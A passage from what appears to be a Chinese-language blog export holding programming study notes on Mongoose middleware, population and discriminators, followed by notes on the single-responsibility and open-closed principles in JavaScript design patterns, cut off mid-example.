second');&#125;);schema.pre('save', function() &#123; console.log('this gets printed third');&#125;);schema.post('save', function() &#123; console.log('this gets printed fourth');&#125;); finAndUpdate() 与 Query 中间件使用注意pre 和 post save() 钩子都不执行于 update ,findOneAndUpdate 等情况。Mongoose4.0 为这些函数制定了新钩子。 123456789101112schema.pre('find',function()&#123; console.log(this instanceof mongoose.Query); // true this.start = Date.now()&#125;);schema.post('find',function(result)&#123; console.log(this instanceof mongoose.Query); // true // prints returned documents console.log('find() returned ' + JSON.stringify(result)); // prints number of milliseconds the query took console.log('find() took ' + (Date.now() - this.start) + ' millis');&#125;); Query 中间件不同于 document 中间件，document 中间件中，this 指向被更新 document,query 中间件中，this 指向query 对象而不是被更新 document 例如，如果要每次 update 之前更新 updateAt 时间戳，可以使用 pre 钩子 123schema.pre('update',function()&#123; this.update(&#123;&#125;,&#123;$set:&#123;updateAt:new Date()&#125;&#125;);&#125;); 错误处理中间件错误处理中间件比普通中间件多一个 error 参数，并且 err 作为第一个参数传入。 而后错误处理中间件可以让你自由地做错误的后续处理。 12345678910111213141516171819const schema = new Schema(&#123; name:&#123; type:String, // // Will trigger a MongoError with code 11000 when you save a duplicate unique:true &#125;&#125;)// 处理函数必须传入3个参数：发生的错误，返回文件，以及 next 函数schema.post('save',function(error,doc,next)&#123; if(error.name === 'MongoError' &amp;&amp; error.code === 11000)&#123; next(new Error('There was a duplicate key error')) &#125;else&#123; next(error); &#125;&#125;);// Will trigger the `post('save')` error handlerPerson.create([&#123;name:'Axl Rose'&#125;,&#123;name:'Axl Rose'&#125;]); 对于query 中间件也可以使用错误处理，可以定义一个 post update 钩子，它可以捕获 MongoDB 重复 key 错误。 1234567891011121314schema.post('update',function(error,res,next)&#123; if(error.name === 'MongoError' &amp;&amp; error.code === 11000)&#123; next(new Error('There was a duplicate key error')) &#125;else&#123; next(error); &#125;&#125;);const people = [&#123;name:'Axl Rose'&#125;,&#123;name:'Axl Rose'&#125;];Person.create(people,function(error)&#123; Person.update(&#123;name:'haha'&#125;,&#123;$set:&#123;name:'Axl Rose'&#125;&#125;,function(error)&#123; // error.message` will be "There was a duplicate key error" &#125;);&#125;) 填充（Populate）像sql 里面的 join 的聚合操作，populate 可以让你在别的 collection 中引用 document Population 可以自动替换 document 中的指定字段，替换内容从其他 collection 获取。我们可以填充单个或者每个 document、单个或者多个纯对象，甚至是 query 返回的一切对象。 1234567891011121314151617181920212223const mongoose = require('mongoose');const Schema = mongoose.Schema;const personSchema = Schema(&#123; _id:Schema.Types.ObjectId, name:String, age:Number, stories:[&#123;type:Schema.Types.ObjectId,ref:'Story'&#125;]&#125;);const storySchema = Schema(&#123; author:&#123; type:Schema.Types.ObjectId, ref:'Person' &#125;, title:String, fans:[&#123; type:Schema.Types.ObjectId, ref:'Person' &#125;]&#125;);const Story = mongoose.model('Story',storySchema);const Person = mongoose.model('Person',personSchema); 上面创建了两个 Model，Person model 的 stories 字段设为 ObjectId 数组。ref 选项告诉 Mongoose 在填充的时候使用哪个 model，上例中为 Story 的 model.所有存储在此的 _id 必须是 Story model 中的 document 的 _id。 注意：ObjectId、Number、String 以及 Buffer 都可以作为 refs 使用。但是最好还是用 ObjectId 保存 refs保存 refs 与保存普通属性一样，把 _id 的值赋给它就好了： 12345678910111213141516171819const author = new Person(&#123; _id: new mongoose.Types.ObjectId(), name: 'Ian Fleming', age: 50&#125;);author.save(function (err) &#123; if (err) return handleError(err); var story1 = new Story(&#123; title: 'Casino Royale', author: author._id // assign the _id from the person &#125;); story1.save(function (err) &#123; if (err) return handleError(err); // thats it! &#125;);&#125;); Population我们做的东西还是跟平时差不多，只是创建了 Person 和 Story。现在试试对query 填充 story 的 author。 123456Story.findOne(&#123; title:'haha'&#125;).population('author').exec(function(err,story)&#123; if(err) return handleError(err); console.log('The author is %s', story.author.name);&#125;); 被填充的字段已经不再是原来的 _id，而是被指定的 document 替代，这个 document 由另一条 query 从数据库返回。refs 数组的原理也是相似的。对 query 对象调用 populate 方法，就能返回装载对应 _id 的 document 数组。 设置被填充字段1234567Story.findOne(&#123; title: 'Casino Royale' &#125;, function(error, story) &#123; if (error) &#123; return handleError(error); &#125; story.author = author; console.log(story.author.name); // prints "Ian Fleming"&#125;); 字段选择如果我们只需要填充 document 其中一部分字段，第二个参数传入 field name syntax 就可以实现。 12345678Story.findOne(&#123;title:/casino royale/i&#125;).populate('author','name').// only return the Persons nameexec(function(err,story)&#123; if(err) return handleError(err); console.log('The author is %s', story.author.name); // The author is Ian Fleming console.log('The author is %s', story.author.age); // The authors age is null&#125;); 填充多个字段12345Story. find(...). populate('fans'). populate('author'). exec(); 如果对同一路径 populate 两次，只有最后一次生效。 1234567// 第二个会覆盖第一个的Story. find(). populate(&#123; path: 'fans', select: 'name' &#125;). populate(&#123; path: 'fans', select: 'email' &#125;);// The above is equivalent to:Story.find().populate(&#123; path: 'fans', select: 'email' &#125;); Query 条件与其他选项如果要根据年龄来填充，只填充 name,并且值返回最多5个数据 12345678910Story. find(...). populate(&#123; path: 'fans', match: &#123; age: &#123; $gte: 21 &#125;&#125;, // Explicitly exclude `_id`, see http://bit.ly/2aEfTdB select: 'name -_id', options: &#123; limit: 5 &#125; &#125;). exec(); Refs 到 children我们发现，用 author 对象没有办法获取 story 列表，因为 author.stories 没有被 pushed 任何 story 对象 我们希望 author 知道哪些 story 属于他们，通常，schema 应该通过在 多 的一方使用指向它们的父节点（parent pointer）解决一对多关系问题。另一方面，如果有充分理由得到指向子节点的数组，可以像下面代码一样把 document push() 到数组中。 12author.stories.push(story1);author.save(callback); 然后我们就能 find 和 populate 了 123456Person.findOne(&#123;name:'Ian Fleming'&#125;).populate('stories').exec(function(err,person)&#123; if(err) throw handleError(err); console.log(person);&#125;); 如果父子节点互相指向，数据可能会在某一时刻失去同步。为此我们可以不使用填充，直接 find()我们需要的 story 12345Story.find(&#123;author:author._id&#125;).exec(function(err, stories)&#123; if (err) return handleError(err); console.log('The stories are an array: ', stories);&#125;); query 填充后返回的 document 功能齐全，除非设置 lean 选项，否则它就是可 remove，可 save 的。调用 remove 不单是从数组中删除也是从数据库中删除它们。 填充现有 documentdocument#populate() 填充多个现有 document如果需要填充一个或者多个 document 对象，我们可以使用 Model.populate 方法。 多级填充假设 user schema 记录了 user 的 friends 1234567const userSchema = new Schema(&#123; name:String, friends:[&#123; type:ObjectId, ref:'User' &#125;]&#125;); 当然可以填充得到用户的 friends 列表，但是如果要在获得他们朋友的朋友呢？指定 populate选项就可以了 1234567User.findOne(&#123;name:'Val'&#125;).populate(&#123; path:'friends', populate:&#123; path:'friends' &#125;&#125;) 跨数据库填充假设现在有 event schema 和 conversation schema,每个 event 对应一个 conversation 线程 1234567const eventSchema = new Schema(&#123; name:String, conversation:ObjectId&#125;);const conversationSchema = new Schema(&#123; numMessage:Number&#125;); 并且，event 和 conversation 保存在不同的 MongoDB 实例中 12345const db1 = mongoose.createConnection('localhost:27000/db1');const db2 = mongoose.createConnection('localhost:27001/db2');const Event = db1.model('Event', eventSchema);const Conversation = db2.model('Conversation', conversationSchema); 这个情况就不能直接使用 populate() 了，因为 populate() 不知道应该使用什么填充。 可以显式指定一个 model 12Event.find().population(&#123;path:'conversation',model:Conversation&#125;).exec(function(err,docs)&#123;&#125;); 动态引用Mongoose 也可以从多个 collection 填充。假设 user schema 有一系列 connection，一个 user 可以连接到其他 user 或者组织。 1234567891011121314const userSchema = new Schema(&#123; name:String, connection:[&#123; kind:String, item:&#123; type:ObjectId, refPath:'connections.kind' &#125; &#125;]&#125;)const organizationSchema = new Schema(&#123;name:String,kind:String&#125;);const User = mongoose.model('User,userSchema');const Organization = mongoose.model('Organization',organizationSchema); 上面的 refPath 属性意味着 mongoose 会查找 connections.kind 路径， 以此确定 populate() 使用的 model。换句话说，refPath 属性可以让你动态寻找 ref。 鉴别器（Discriminators）Discriminator 是一种 schema 继承机制。它允许在相同的底层 MongoDB collection 上使用部分重叠的 schema 建立多个 model。 假设要在单个 collection 中记录多种 event ，每个 event 都有时间戳字段，但是 click 事件还有 URL 字段，可以用 model.discriminator 实现上面的要求。这个函数需要两个参数，model 名称和 discriminator schema,返回 model 结合原 model 的 schema 和 discriminator schema. 12345678910111213141516const options = &#123; discriminatorKey:'kind' &#125;const eventSchema = new mongoose.Schema(&#123;tiem:Date&#125;,options);const Event = mongoose.model('Event'.eventSchema);// ClickedLinkEvent 是一个有 URL 的特别 eventconst ClickedLinkEvent = Event.discriminator('ClickedLink', new mongoose.Schema(&#123;url: String&#125;, options));// 当你创建通用 event，他将没有 URL 字段...const genericEvent = new Event(&#123;time: Date.now(), url: 'google.com'&#125;);assert.ok(!genericEvent.url);// 但是 ClickedLinkEvent 可以有const clickedEvent = new ClickedLinkEvent(&#123;time: Date.now(), url: 'google.com'&#125;);assert.ok(clickedEvent.url); Discriminator 储存在 Event model 的 collection现在假设你要创建另一个 discriminator，记录用户注册 event。 SignedUpEvent 实例将跟 通用 events 和 ClickedLinkEvent 实例 一样储存在同一个 collection。 12345678910111213141516const event1 = new Event(&#123;time: Date.now()&#125;);const event2 = new ClickedLinkEvent(&#123;time: Date.now(), url: 'google.com'&#125;);const event3 = new SignedUpEvent(&#123;time: Date.now(), user: 'testuser'&#125;);const save = function (doc, callback) &#123; doc.save(function (error, doc) &#123; callback(error, doc); &#125;);&#125;;async.map([event1, event2, event3], save, function (error) &#123; Event.count(&#123;&#125;, function (error, count) &#123; assert.equal(count, 3); &#125;);&#125;); Discriminator keysMongoose 通过 ‘discriminator key’ 识别两个不同的 discriminator， 这个值默认是 __t 。Mongoose 自动在你的 schema 添加 __t 字段， 记录你的 document 是哪个 discriminator 的实例。 1234567const event1 = new Event(&#123;time: Date.now()&#125;);const event2 = new ClickedLinkEvent(&#123;time: Date.now(), url: 'google.com'&#125;);const event3 = new SignedUpEvent(&#123;time: Date.now(), user: 'testuser'&#125;);assert.ok(!event1.__t);assert.equal(event2.__t, 'ClickedLink');assert.equal(event3.__t, 'SignedUp'); Discriminator 在查询中添加 discriminator keyDiscriminator model 的特别之处在于：他们会把 discriminator key 附到 query 上。换句话说，find(), count(), aggregate() 等方法 都能适配 discriminators。 123456789101112131415161718const event1 = new Event(&#123;time: Date.now()&#125;);const event2 = new ClickedLinkEvent(&#123;time: Date.now(), url: 'google.com'&#125;);const event3 = new SignedUpEvent(&#123;time: Date.now(), user: 'testuser'&#125;);const save = function (doc, callback) &#123; doc.save(function (error, doc) &#123; callback(error, doc); &#125;);&#125;;async.map([event1, event2, event3], save, function (error) &#123; ClickedLinkEvent.find(&#123;&#125;, function (error, docs) &#123; assert.equal(docs.length, 1); assert.equal(docs[0]._id.toString(), event2._id.toString()); assert.equal(docs[0].url, 'google.com'); &#125;);&#125;); Discriminator 复制 pre / post 钩子Discriminator 会继承他的基础 schema 的 pre 和 post 中间件。 不过，你也可以为 discriminator 添加中间件，这不回影响到基础 schema。 123456789101112131415161718192021222324252627282930const options = &#123;discriminatorKey: 'kind'&#125;;const eventSchema = new mongoose.Schema(&#123;time: Date&#125;, options);const eventSchemaCalls = 0;eventSchema.pre('validate', function (next) &#123; ++eventSchemaCalls; next();&#125;);const Event = mongoose.model('GenericEvent', eventSchema);const clickedLinkSchema = new mongoose.Schema(&#123;url: String&#125;, options);const clickedSchemaCalls = 0;clickedLinkSchema.pre('validate', function (next) &#123; ++clickedSchemaCalls; next();&#125;);const ClickedLinkEvent = Event.discriminator('ClickedLinkEvent', clickedLinkSchema);const event1 = new ClickedLinkEvent();event1.validate(function() &#123; assert.equal(eventSchemaCalls, 1); assert.equal(clickedSchemaCalls, 1); const generic = new Event(); generic.validate(function() &#123; assert.equal(eventSchemaCalls, 2); assert.equal(clickedSchemaCalls, 1); &#125;);&#125;); 处理自定义 _id 字段Discriminator 的字段是基础 schema 加 discriminator schema ， 并且以 discriminator schema 的字段优先。 但有一个例外，_id 字段。 You can work around this by setting the _id option to false in the discriminator schema as shown below. 1234567891011121314151617181920212223const options = &#123;discriminatorKey: 'kind'&#125;;// 基础 schema 有字符串格式的 `_id` 字段和 Data 格式的 `time` 字段...const eventSchema = new mongoose.Schema(&#123;_id: String, time: Date&#125;, options);const Event = mongoose.model('BaseEvent', eventSchema);const clickedLinkSchema = new mongoose.Schema(&#123; url: String, time: String&#125;, options);// 但是 Discriminator schema 有字符串格式的 `time`，并且有// 隐式添加的 ObjectId 格式的 `_id`assert.ok(clickedLinkSchema.path('_id'));assert.equal(clickedLinkSchema.path('_id').instance, 'ObjectID');const ClickedLinkEvent = Event.discriminator('ChildEventBad', clickedLinkSchema);const event1 = new ClickedLinkEvent(&#123; _id: 'custom id', time: '4pm' &#125;);// 问题来了，clickedLinkSchema 重写了 `time` 路径，但是**没有**// 重写 `_id` 路径，因为已经隐式添加（没看懂）assert.ok(typeof event1._id === 'string');assert.ok(typeof event1.time === 'string'); discriminator 与 Model.create()当你使用 Model.create()，Mongoose 会自动帮你适配 discriminator key ~ 1234567891011121314151617181920212223242526const Schema = mongoose.Schema;const shapeSchema = new Schema(&#123; name: String&#125;, &#123; discriminatorKey: 'kind' &#125;);const Shape = db.model('Shape', shapeSchema);const Circle = Shape.discriminator('Circle', new Schema(&#123; radius: Number &#125;));const Square = Shape.discriminator('Square', new Schema(&#123; side: Number &#125;));const shapes = [ &#123; name: 'Test' &#125;, &#123; kind: 'Circle', radius: 5 &#125;, &#123; kind: 'Square', side: 10 &#125;];Shape.create(shapes, function(error, shapes) &#123; assert.ifError(error); // 重点看这里 assert.ok(shapes[0] instanceof Shape); assert.ok(shapes[1] instanceof Circle); assert.equal(shapes[1].radius, 5); assert.ok(shapes[2] instanceof Square); assert.equal(shapes[2].side, 10);&#125;); 数组中的嵌套 discriminator你也可以为嵌套文档数组定义 discriminator。 嵌套 discriminator 的特点是：不同 discriminator 类型储存在相同的文档而不是同一个 mongoDB collection。 换句话说，嵌套 discriminator 让你 在同一个数组储存符合不同 schema 的子文档。 最佳实践：确保你声明了钩子再使用他们。 你不应当在调用 discriminator() 之后调用 pre() 或 post() 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162const eventSchema = new Schema(&#123; message: String &#125;, &#123; discriminatorKey: 'kind', _id: false &#125;);const batchSchema = new Schema(&#123; events: [eventSchema] &#125;);// `batchSchema.path('events')` gets the mongoose `DocumentArray`const docArray = batchSchema.path('events');// 这个 `events` 数组可以包含 2 种不同的 event 类型，// 'clicked' event that requires an element id that was clicked...const clickedSchema = new Schema(&#123; element: &#123; type: String, required: true &#125;&#125;, &#123; _id: false &#125;);// 确定在调用 `discriminator()` **之前**// 对 `eventSchema` 和 `clickedSchema` 赋予钩子const Clicked = docArray.discriminator('Clicked', clickedSchema);// ... and a 'purchased' event that requires the product that was purchased.const Purchased = docArray.discriminator('Purchased', new Schema(&#123; product: &#123; type: String, required: true &#125;&#125;, &#123; _id: false &#125;));const Batch = db.model('EventBatch', batchSchema);// Create a new batch of events with different kindsconst batch = &#123; events: [ &#123; kind: 'Clicked', element: '#hero', message: 'hello' &#125;, &#123; kind: 'Purchased', product: 'action-figure-1', message: 'world' &#125; ]&#125;;Batch.create(batch). then(function(doc) &#123; assert.equal(doc.events.length, 2); assert.equal(doc.events[0].element, '#hero'); assert.equal(doc.events[0].message, 'hello'); assert.ok(doc.events[0] instanceof Clicked); assert.equal(doc.events[1].product, 'action-figure-1'); assert.equal(doc.events[1].message, 'world'); assert.ok(doc.events[1] instanceof Purchased); doc.events.push(&#123; kind: 'Purchased', product: 'action-figure-2' &#125;); return doc.save(); &#125;). then(function(doc) &#123; assert.equal(doc.events.length, 3); assert.equal(doc.events[2].product, 'action-figure-2'); assert.ok(doc.events[2] instanceof Purchased); done(); &#125;). catch(done); 检索数组中的嵌套 discriminator检索嵌套 discriminator 12345678910111213141516171819202122232425262728293031323334353637383940414243444546const singleEventSchema = new Schema(&#123; message: String &#125;, &#123; discriminatorKey: 'kind', _id: false &#125;);const eventListSchema = new Schema(&#123; events: [singleEventSchema] &#125;);const subEventSchema = new Schema(&#123; sub_events: [singleEventSchema]&#125;, &#123; _id: false &#125;);const SubEvent = subEventSchema.path('sub_events').discriminator('SubEvent', subEventSchema)eventListSchema.path('events').discriminator('SubEvent', subEventSchema);const Eventlist = db.model('EventList', eventListSchema);// Create a new batch of events with different kindsconst list = &#123; events: [ &#123; kind: 'SubEvent', sub_events: [&#123;kind:'SubEvent', sub_events:[], message:'test1'&#125;], message: 'hello' &#125;, &#123; kind: 'SubEvent', sub_events: [&#123;kind:'SubEvent', sub_events:[&#123;kind:'SubEvent', sub_events:[], message:'test3'&#125;], message:'test2'&#125;], message: 'world' &#125; ]&#125;;Eventlist.create(list). then(function(doc) &#123; assert.equal(doc.events.length, 2); assert.equal(doc.events[0].sub_events[0].message, 'test1'); assert.equal(doc.events[0].message, 'hello'); assert.ok(doc.events[0].sub_events[0] instanceof SubEvent); assert.equal(doc.events[1].sub_events[0].sub_events[0].message, 'test3'); assert.equal(doc.events[1].message, 'world'); assert.ok(doc.events[1].sub_events[0].sub_events[0] instanceof SubEvent); doc.events.push(&#123;kind:'SubEvent', sub_events:[&#123;kind:'SubEvent', sub_events:[], message:'test4'&#125;], message:'pushed'&#125;); return doc.save(); &#125;). then(function(doc) &#123; assert.equal(doc.events.length, 3); assert.equal(doc.events[2].message, 'pushed'); assert.ok(doc.events[2].sub_events[0] instanceof SubEvent); done(); &#125;). catch(done); ###]]></content>
      <categories>
        <category>数据库相关</category>
      </categories>
      <tags>
        <tag>数据库相关</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JavaScript设计原则和编程技巧——单一职责原则]]></title>
    <url>%2F2019-03-22-JavaScript%E8%AE%BE%E8%AE%A1%E5%8E%9F%E5%88%99%E5%92%8C%E7%BC%96%E7%A8%8B%E6%8A%80%E5%B7%A7%E2%80%94%E2%80%94%E5%8D%95%E4%B8%80%E8%81%8C%E8%B4%A3%E5%8E%9F%E5%88%99.html</url>
    <content type="text"><![CDATA[学习曾探的 《JavaScript设计模式与开发实践》并做记录。 书籍的购买链接 设计模式的定义是：在面向对象软件设计过程中针对特定问题的简洁而优雅的解决方案。 通俗一点，设计模式是在某种场合下对某个问题的一种解决方案。是给面向对象软件开发中的一些好的设计取个名字。 说每种设计模式都是为了让代码迎合其中一个或多个原则而出现的，它们本身已经融入了设计模式之中，给面向对象编程指明了方向。 前辈总结的这些设计原则通常指的是单一职责原则、里氏替换原则、依赖倒置原则、接口隔离原则、合成复用原则和最少知识原则 JavaScript设计原则和编程技巧——单一职责原则就一个类而言，应该仅有一个引起它变化的原因，在JavaScript 中，需要用到的类的场景并不太多，单一职责原则则是更多地运用在对象或者方法级别上面。 单一职责原则（SRP）的职责被定义为引起变化的原因。如果我们有两个动机去改写一个方法，那么这个方法就具有两个职责。每个职责都是变化的一个轴线。如果一个方法承担了过多的职责，那么杂需求的变迁中，需要改写这个方法的可能性就越大。 因此，SRP原则体现为：一个对象（方法）只做一件事情。 设计模式中的SRP原则SRP原则在很多设计模式中都有着很广泛的应用，例如代理模式，迭代器模式、单例模式和装饰者模式。 1.代理模式 图片预加载，通过增加虚拟代理的方式，把预加载图片的职责放到代理对象中，而本体仅仅是负责往页面中添加 img 标签，这也是它最原始的职责。 123456789const myImage = function()&#123; const imgNode = document.createElement('img'); document.body.appendChild(imgNode); return&#123; setSrc:function(src)&#123; imgNode.src = src; &#125; &#125;&#125; proxyImage 负责预加载图片，并在预加载完成之后把请求交给本体 myImage: 123456789101112const proxyImage = (function()&#123; const img = new Image; img.onload = function()&#123; myImage.setSrc(this.src); &#125; return&#123; setSrc:function(src)&#123; myImage.setSrc('xxx.jpg'); img.src = src; &#125; &#125;&#125;)(); 把添加 img 标签的功能和预加载图片的职责分开放到两个对象中，这两个对象各自都只有一个被修改的动机。在它们各自发生改变的时候，也不会影响另外的对象 2.迭代器模式 我们有这样一段代码，先遍历一个集合，然后往页面中添加一些 div，这些 div 的 innerHTML分别对应集合里的元素： 12345678const appendDiv = function(data)&#123; for(let i=0,l=data.length;i&lt;l;i++)&#123; const div = document.createElememt('div'); div.innerHTML = data[i]; document.body.appendChild(div); &#125;&#125;appendDiv( [ 1, 2, 3, 4, 5, 6 ] ); 这其实是一段很常见的代码，经常用于 ajax 请求之后，在回调函数中遍历 ajax 请求返回的数据，然后在页面中渲染节点。 appendDiv 函数本来只是负责渲染数据，但是在这里它还承担了遍历聚合对象 data 的职责。我们想象一下，如果有一天 cgi 返回的 data 数据格式从 array 变成了 object，那我们遍历 data 的代码就会出现问题，必须改成 for ( var i in data )的方式，这时候必须去修改 appendDiv 里的代码，否则因为遍历方式的改变，导致不能顺利往页面中添加 div 节点. 我们有必要把遍历 data 的职责提取出来，这正是迭代器模式的意义，迭代器模式提供了一种方法来访问聚合对象，而不用暴露这个对象的内部表示 当把迭代聚合对象的职责单独封装在 each 函数中后，即使以后还要增加新的迭代方式，我们只需要修改 each 函数即可，appendDiv 函数不会受到牵连，代码如下： 1234567891011121314151617181920212223242526const each = function(obj,callback)&#123; const value, i = 0, length = obj.length, isArray = isArraylike(obj); if(isArray)&#123; for(;i&lt;length;i++)&#123; callback.call(obj[i],i,obj[i]); &#125; &#125;else&#123; for( i in obj)&#123; value = callback.call(obj[i],i,obj[i]); &#125; &#125; return obj;&#125;const appendDiv = function(data)&#123; each(data,function(i,n)&#123; const div = document.createElememt('div'); div.innerHTML = n; document.body.appendChild(div); &#125;)&#125;appendDiv( [ 1, 2, 3, 4, 5, 6 ] ); appendDiv(&#123;a:1,b:2,c:3,d:4&#125; ); 3.单例模式 惰性单例，最开始的代码是这样的 123456789101112const createLogin = (function()&#123; let div; return function()&#123; if(!div)&#123; div = document.createElement('div'); div.innerHTML = '我是登录浮窗'; div.style.display = 'none'; document.body.appendChild(div); &#125; return div; &#125;&#125;)(); 现在我们把管理单例的职责和创建登录浮窗的职责分别封装在两个方法里，这两个方法可以独立变化而互不影响，当它们连接在一起的时候，就完成了创建唯一登录浮窗的功能，下面的代码显然是更好的做法： 12345678910111213141516const getSingle = function(fn)&#123; let result; return functiion()&#123; return result || (result = fn.apply(this,arguments)); &#125;&#125;const createLogin = function()&#123; div = document.createElement('div'); div.innerHTML = '我是登录浮窗'; div.style.display = 'none'; document.body.appendChild(div);&#125;const createSingleLogin = getSingle(createLogin);const l1 = createSingleLogin();const l2 = createSingleLogin();l1 === l2 // true 4.装饰者模式 使用装饰者模式的时候，我们通常让类或者对象一开始只具有一些基础的职责，更多的职责在代码运行时被动态装饰到对象上面。装饰者模式可以为对象动态增加职责，从另一个角度来看，这也是分离职责的一种方式 我们把数据上报的功能单独放在一个函数里，然后把这个函数动态装饰到业务函数上面： 123456789101112131415Function.prototype.after = function( afterfn )&#123; const __self = this; return function()&#123; var ret = __self.apply( this, arguments ); afterfn.apply( this, arguments ); return ret; &#125; &#125;; const showLogin = function()&#123; console.log( '打开登录浮层' ); &#125;; const log = function()&#123; console.log( '上报标签为: ' + this.getAttribute( 'tag' ) ); &#125;document.getElementById( 'button' ).onclick = showLogin.after( log ); 何时应该分离职责SRP 原则是所有原则中最简单也是最难正确运用的原则之一。 一方面，随着需求的变化，有两个原则总是同时变化，那么就不必分离它们，比如在 ajax 请求的时候，创建 xhr 对象和发送 xhr 对象几乎总是在一起的，那么创建 xhr 对象的职责和发送 xhr 请求的职责就没有必要分开。 另一方面，职责的变化轴线仅当它们确定会发生变化时才具有意义，即使两个职责已经被耦合在一起，但它们还没有发生改变的征兆，那么也许就没有必须要分离它们。在代码重构的时候再分离也不迟。 违反SRP原则在人的常规思维中，总是习惯性地把一组相关的行为放到一起，如何正确地分离职责不是一件容易的事情。 我们也许从来没有考虑过如何分离职责，但这并不妨碍我们编写代码完成需求。对于 SRP原则，许多专家委婉地表示“This is sometimes hard to see.”。 一方面，我们受设计原则的指导，另一方面，我们未必要在任何时候都一成不变地遵守原则。在实际开发中，因为种种原因违反 SRP 的情况并不少见。比如 jQuery 的 attr 等方法，就是明显违反 SRP 原则的做法。jQuery 的 attr 是个非常庞大的方法，既负责赋值，又负责取值，这对于jQuery 的维护者来说，会带来一些困难，但对于 jQuery 的用户来说，却简化了用户的使用。 在方便性与稳定性之间要有一些取舍。具体是选择方便性还是稳定性，并没有标准答案，而是要取决于具体的应用环境。比如如果一个电视机内置了 DVD 机，当电视机坏了的时候，DVD机也没法正常使用，那么一个 DVD 发烧友通常不会选择这样的电视机。但如果我们的客厅本来就小得夸张，或者更在意 DVD 在使用上的方便，那让电视机和 DVD 机耦合在一起就是更好的选择 SRP原则的优缺点优点是降低单个类或者对象的复杂度，按照职责把对象分解成为更加小的粒度，这有助于代码的复用，也有利于单元测试，当一个职责需要变更的时候，不会影响到其他的职责。 缺点是会增加代码的复杂度，当我们按照职责将对象分解成更小的粒度之后，实际上也增大了这些对象之间互相联系的难度。]]></content>
      <categories>
        <category>JavaScript设计模式</category>
      </categories>
      <tags>
        <tag>JavaScript设计模式</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JavaScript设计原则和编程技巧——开放-封闭原则]]></title>
    <url>%2F2019-03-22-JavaScript%E8%AE%BE%E8%AE%A1%E5%8E%9F%E5%88%99%E5%92%8C%E7%BC%96%E7%A8%8B%E6%8A%80%E5%B7%A7%E2%80%94%E2%80%94%E6%9C%80%E5%B0%91%E7%9F%A5%E8%AF%86%E5%8E%9F%E5%88%99.html</url>
    <content type="text"><![CDATA[学习曾探的 《JavaScript设计模式与开发实践》并做记录。 书籍的购买链接 设计模式的定义是：在面向对象软件设计过程中针对特定问题的简洁而优雅的解决方案。 通俗一点，设计模式是在某种场合下对某个问题的一种解决方案。是给面向对象软件开发中的一些好的设计取个名字。 说每种设计模式都是为了让代码迎合其中一个或多个原则而出现的，它们本身已经融入了设计模式之中，给面向对象编程指明了方向。 前辈总结的这些设计原则通常指的是单一职责原则、里氏替换原则、依赖倒置原则、接口隔离原则、合成复用原则和最少知识原则 JavaScript设计原则和编程技巧——开放-封闭原则在面向对象的程序设计中，开放封闭原则（OCP）是最重要的一条原则。很多时候，一个程序具有良好的设计，往往说明它是符合开放-封闭原则的 软件实体（类、模块、函数）等应该是可以扩展的，但是不可修改 扩展 window.onload 函数假设我们是一个大型 Web 项目的维护人员，在接手这个项目时，发现它已经拥有 10 万行以上的 JavaScript 代码和数百个 JS 文件。 不久后接到了一个新的需求，即在 window.onload 函数中打印出页面中的所有节点数量。这当然难不倒我们了。于是我们打开文本编辑器，搜索出 window.onload 函数在文件中的位置，在函数内部添加以下代码： 1234window.onload = function()&#123; // 原有代码略 console.log( document.getElementsByTagName( '*' ).length ); &#125;; 在项目需求变迁的过程中，我们经常会找到相关代码，然后改写它们。这似乎是理所当然的事情，不改动代码怎么满足新的需求呢？想要扩展一个模块，最常用的方式当然是修改它的源代码。如果一个模块不允许修改，那么它的行为常常是固定的。然而，改动代码是一种危险的行为，也许我们都遇到过 bug 越改越多的场景。刚刚改好了一个 bug，但是又在不知不觉中引发了其他的 bug。 那么，有没有办法在不修改代码的情况下，就能满足新需求呢？ 1234567891011Function.prototype.after = function(afterfn)&#123; const self = this; return function()&#123; const ret = self.apply(this,arguments); afterfn.apply(this,arguments); return ret; &#125;&#125;window.onload = (window.onload || function()&#123;&#125;).after(function()&#123; console.log(xxx);&#125;); 通过动态装饰函数的方式，我们完全不用理会从前 window.onload 函数的内部实现，无论它的实现优雅或是丑陋。就算我们作为维护者，拿到的是一份混淆压缩过的代码也没有关系。只要它从前是个稳定运行的函数，那么以后也不会因为我们的新增需求而产生错误。新增的代码和原有的代码可以井水不犯河水。 开发和封闭上一节为 window.onload 函数扩展功能时，用到了两种方式。一种是修改原有的代码，另一种是增加一段新的代码。使用哪种方式效果更好，已经不言而喻。 封闭-开发原则的思想：当需要改变一个程序的功能或者给这个程序增加新的功能的时候，可以使用增加代码的方式，但是不允许改动程序的源代码。 在现实生活中，我们也能找到一些跟开放封闭原则相关的故事。下面这个故事人尽皆知，且跟肥皂相关 有一家生产肥皂的大企业，从欧洲花巨资引入了一条生产线。这条生产线可以自动完成从原材料加工到包装成箱的整个流程，但美中不足的是，生产出来的肥皂有一定的空盒几率。于是老板又从欧洲找来一支专家团队，花费数百万元改造这一生产线，终于解决了生产出空盒肥皂的问题。 另一家企业也引入了这条生产线，他们同样遇到了空盒肥皂的问题。但他们的解决办法很简单：用一个大风扇在生产线旁边吹，空盒肥皂就会被吹走。 这个故事告诉我们，相比修改源程序，如果通过增加几行代码就能解决问题，那这显然更加简单和优雅，而且增加代码并不会影响原系统的稳定。讲述这个故事，我们的目的不在于说明风扇的成本有多低，而是想说明，如果使用风扇这样简单的方式可以解决问题，根本没有必要去大动干戈地改造原有的生产线。 用对象的多态性消除条件分支过多的条件分支语句是造成程序违反开放-封闭原则的一个常见原因。每当需要增加一个新的 if 语句时，都要被迫改动原函数。把 if 换成 switch-case 是没有用的，这是一种换汤不换药的做法。实际上，每当我们看到一大片的 if 或者 swtich-case 语句时，第一时间就应该考虑，能否利用对象的多态性来重构它们。 利用对象的多态性来让程序遵守开放-封闭原则，是一个常用的技巧。用让动物发出叫声的例子。下面先提供一段不符合开放-封闭原则的代码。每当我们增加一种新的动物时，都需要改动makeSound 函数的内部实现 123456789101112131415161718192021222324252627282930313233343536373839404142434445// 改动前var makeSound = function( animal )&#123; if ( animal instanceof Duck )&#123; console.log( '嘎嘎嘎' ); &#125;else if ( animal instanceof Chicken )&#123; console.log( '咯咯咯' ); &#125; &#125;; var Duck = function()&#123;&#125;; var Chicken = function()&#123;&#125;; makeSound( new Duck() ); // 输出：嘎嘎嘎makeSound( new Chicken() ); // 输出：咯咯咯// 动物世界里增加一只狗之后，makeSound 函数必须改成：var makeSound = function( animal )&#123; if ( animal instanceof 